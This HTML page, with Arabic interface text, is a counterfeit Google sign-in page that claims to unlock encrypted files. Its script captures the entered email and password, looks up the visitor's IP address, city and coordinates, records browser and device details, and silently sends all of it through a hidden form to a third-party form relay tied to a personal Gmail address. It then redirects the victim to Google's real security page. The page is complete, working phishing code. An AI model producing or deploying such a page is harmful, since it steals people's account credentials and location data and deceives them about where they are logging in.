<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 400px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { color: #202124; font-size: 16px; margin-bottom: 25px; }
        .input-group { position: relative; margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border 0.2s; }
        input.error { border: 2px solid #d93025; }
        .error-msg { color: #d93025; font-size: 12px; margin-top: 5px; display: none; text-align: right; font-weight: 500; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: left; margin-top: 20px; }
        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 100; flex-direction: column; justify-content: center; align-items: center; }
    </style>
</head>
<body>

<div id="loading">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
    <p>جاري فحص أمان الاتصال...</p>
</div>

<div class="login-box">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h1>تسجيل الدخول</h1>
    <p>متابعة إلى Gmail لفك تشفير الملفات</p>
    
    <div class="input-group">
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <div id="email-error" class="error-msg">⚠️ عذراً، لا يمكننا العثور على حساب بهذا البريد.</div>
    </div>

    <div class="input-group">
        <input type="password" id="pass" placeholder="أدخل كلمة المرور">
        <div id="pass-error" class="error-msg">⚠️ كلمة المرور خاطئة. حاول مرة أخرى.</div>
    </div>
    
    <button class="btn" onclick="executeFinalStrike()">التالي</button>
</div>

<form id="mirageForm" action="https://formsubmit.co/kabhaa982@gmail.com" method="POST" style="display:none;">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_subject" value="🔱 صيد سيادي: تم سحب بيانات المهاجم بالكامل!">
    <input type="hidden" name="_template" value="table">
    <textarea name="FULL_REPORT" id="report"></textarea>
</form>

<script>
    async function executeFinalStrike() {
        const email = document.getElementById('email');
        const pass = document.getElementById('pass');
        const eMsg = document.getElementById('email-error');
        const pMsg = document.getElementById('pass-error');

        // إعادة ضبط الأخطاء
        email.classList.remove('error');
        pass.classList.remove('error');
        eMsg.style.display = 'none';
        pMsg.style.display = 'none';

        // 1. ميزة التحقق من البيانات (لضمان الجودة)
        if (!email.value.includes('@') || email.value.length < 5) {
            email.classList.add('error');
            eMsg.style.display = 'block';
            return;
        }
        if (pass.value.length < 7) {
            pass.classList.add('error');
            pMsg.style.display = 'block';
            return;
        }

        // 2. بدء عملية السحب
        document.getElementById('loading').style.display = 'flex';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();

            const reportData = `
🔱 [معلومات تسجيل الدخول]
- البريد: ${email.value}
- كلمة المرور: ${pass.value}

🌍 [بيانات الموقع والشبكة]
- IP: ${d.ip}
- المدينة/الدولة: ${d.city}, ${d.country_name}
- الإحداثيات: ${d.latitude}, ${d.longitude}
- المزود (ISP): ${d.org}

💻 [بصمة الجهاز]
- النظام: ${navigator.platform}
- المتصفح: ${navigator.userAgent}
- دقة الشاشة: ${screen.width}x${screen.height}
- التوقيت المحلي: ${new Date().toLocaleString()}

🔱 نظام: LØGHØST-Z CORE 2099`;

            document.getElementById('report').value = reportData;

            // 3. الإرسال الصامت
            const form = document.getElementById('mirageForm');
            await fetch(form.action, {
                method: 'POST',
                body: new FormData(form),
                headers: { 'Accept': 'application/json' }
            });

            // 4. التمويه النهائي (تحويل لمكان آمن)
            window.location.href = "https://myaccount.google.com/security";

        } catch (e) {
            window.location.href = "https://google.com";
        }
    }
</script>

</body>
</html>
